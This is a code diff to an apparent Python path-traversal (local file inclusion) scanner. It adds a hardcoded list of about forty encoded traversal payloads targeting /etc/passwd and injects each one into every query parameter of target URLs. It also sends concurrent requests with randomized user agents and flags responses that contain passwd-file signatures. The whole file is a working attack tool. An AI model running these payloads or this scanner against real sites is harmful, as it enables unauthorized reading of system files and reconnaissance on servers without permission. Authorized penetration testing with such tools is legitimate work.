@@ -1,41 +1,109 @@
-import aiohttp
 import asyncio
-from urllib.parse import parse_qs,urlencode,urlunparse,urlparse
+import aiohttp
+from colorama import Fore, init
+import urllib.parse
+import random
+from scripts.useragent.user_agent import _useragent_list
+
+init(autoreset=True)
+
+grey = Fore.LIGHTBLACK_EX
+green = Fore.GREEN
+
+lfi_payloads = [
+    "etc/passwd",
+    "/etc/passwd",
+    "..;/etc/passwd",
+    "../etc/passwd",
+    "../../etc/passwd",
+    "../../../etc/passwd",
+    "../../../../etc/passwd",
+    "../../../../../etc/passwd",
+    "../../../../../../etc/passwd",
+    "../../../../../../../etc/passwd",
+    "../../../../../../../../etc/passwd",
+    "../../../../../../../../../etc/passwd",
+    "../../../../../../../../../../etc/passwd",
+    "../../../../../../../../../../../etc/passwd",
+    "../../../../../../../../../../../../etc/passwd",
+    "..%2fetc%2fpasswd",
+    "..%2f..%2fetc%2fpasswd",
+    "..%2f..%2f..%2fetc%2fpasswd",
+    "..%2f..%2f..%2f..%2fetc%2fpasswd",
+    "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
+    "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
+    "..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
+    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+    "%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+    "%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+    "%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+    "%252e%252e/%252e%252e/%252e%252e/etc/passwd",
+    "%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd",
+    "%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd",
+    "%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd",
+    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+    "%252e%252e%2f%252e%252e%2f%252e%252e%2f%252e%252e%2fetc/passwd",
+    "%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215etc%u2215passwd",
+    "%c0%ae%c0%ae%c0%afetc%c0%afpasswd",
+    "%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd",
+    "%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd",
+    "%e0%40%ae%e0%40%ae%c0%afetc%c0%afpasswd",
+    "%e0%40%ae%e0%40%ae%c0%af%e0%40%ae%e0%40%ae%c0%afetc%c0%afpasswd",
+    "%c1%1c..%c1%1c..%c1%1cetc%c1%1cpasswd",
+    "..%c0%ae/..%c0%ae/..%c0%ae/etc/passwd"
+]
 
 keywords = [
-    "root", "daemon", "bin", "sys", "sync", "games", "man", "lp", "mail", "news", "uucp",
-    "proxy", "www-data", "backup", "list", "irc", "gnats", "nobody", "_apt", "uuidd", "messagebus",
-    "/bin/bash", "/usr/sbin/nologin", "/bin/sync", "/usr/games", "/var/cache/man", "/var/spool/lpd",
-    "/var/mail", "/var/spool/news", "/var/spool/uucp", "/root", "/var/backups", "/var/list", "/var/run/ircd",
-    "/var/lib/gnats", "/nonexistent", "/run/uuidd"
+    "root:x:0:0",
+    "/bin/bash",
+    "/bin/sh",
+    "/usr/sbin/nologin",
+    "daemon:x:",
+    "bin:x:",
+    "sys:x:",
+    "sync:x:",
+    "games:x:",
+    "nobody:x:",
+    ":/home/",
+    ":/root",
+    ":/usr/sbin",
 ]
 
 
-async def scan_pt(url, session):
-    async with session.get(url) as response:
-        r = await response.text()
-        for keyword in keywords:
-            if keyword in r:
-                print(f"[+] LFI FOUND IN {url}")
-            else:
-                pass
-
-async def main(file, pathtraversalWordlist):
-    with open(file, 'r') as fr:
-        urls = fr.readlines()
-    with open(pathtraversalWordlist, 'r') as rf1:
-        payloads_path = rf1.readlines()
-
+sem = asyncio.Semaphore(50)
+async def scan_lfi(url,session):
+    user_agent = random.choice(_useragent_list)
+    header = {"User-Agent":user_agent}
+    async with sem:
+        try:
+            async with session.get(url, headers=header, timeout=10) as response:
+                response_text = await response.text()
+                if any(keyword in response_text for keyword in keywords):
+                    print(f"{grey}[{url}] {green}LFI FOUND")
+        except Exception:
+            pass
+async def main(url: str = None, file: str = None):
+    tasks = []
     async with aiohttp.ClientSession() as session:
-        task = []
-        for payload in payloads_path:
-            for url in urls:
-                url_parse = urlparse(url.strip())
-                qs = parse_qs(url_parse.query)
+        if not file and url:
+            for payload in lfi_payloads:
+                urlParse = urllib.parse.urlparse(url)
+                qs = urllib.parse.parse_qsl(urlParse.query)
+                new_qs = [(k, payload) for k,_ in qs]
+                qs_encode = urllib.parse.urlencode(new_qs)
+                new_url = urllib.parse.urlunparse(urlParse._replace(query=qs_encode))
+                tasks.append(scan_lfi(new_url,session))
+            await asyncio.gather(*tasks)
+        elif file and not url:
+            with open(file, 'r') as read_urls:
+                urls = read_urls.readlines()
+            for payload in lfi_payloads:
+                for url in urls:
+                    urlparsed = urllib.parse.urlparse(url)
+                    qs = urllib.parse.parse_qsl(urlparsed.query)
+                    new_qs = [(k,payload) for k,_ in qs]
+                    encode_qs = urllib.parse.urlencode(new_qs)
+                    new_url = urllib.parse.urlunparse(urlparsed._replace(query=encode_qs))
+                    tasks.append(scan_lfi(new_url, session))
                 
-                for key in qs:
-                    qs[key] = [payload.strip()]
-                    new_query = urlencode(qs, doseq=True)
-                    new_url = urlunparse(url_parse._replace(query=new_query))
-                    task.append(scan_pt(new_url, session))
-        await asyncio.gather(*task)
+            await asyncio.gather(*tasks)
